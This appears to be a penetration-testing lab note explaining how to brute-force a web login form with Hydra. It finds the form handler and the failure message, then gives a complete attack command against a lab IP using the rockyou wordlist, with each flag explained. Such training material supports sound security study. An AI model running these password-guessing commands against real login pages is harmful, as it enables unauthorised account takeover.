HTTP POST attack against Apache server.

 **http-form-post** service module "additional info" page:
` hydra http-form-post -U`
```
...
Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
...
```

Examine the page source at **/form/login.html**

Post request is handled by **/form/frontpage.php**, which we will feed to hydra.

Parameters are **user:pass**

Condition string is for an unsuccessful attempt: **INVALID LOGIN**

Put it together:
`hydra 10.11.0.22 http-form-post
"/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P
/usr/share/wordlists/rockyou.txt -vV -f`
**-l** username
**-P** wordlist
**-vV** Verbose output
**-f** stop attack when first successful result found
**http-form-post** Service module name
**“/form/frontpage.php:user=admin&pass=^PASS^:INVALID
LOGIN”** Required arugments with ^PASS^ acting as a placeholder for our wordlist file entries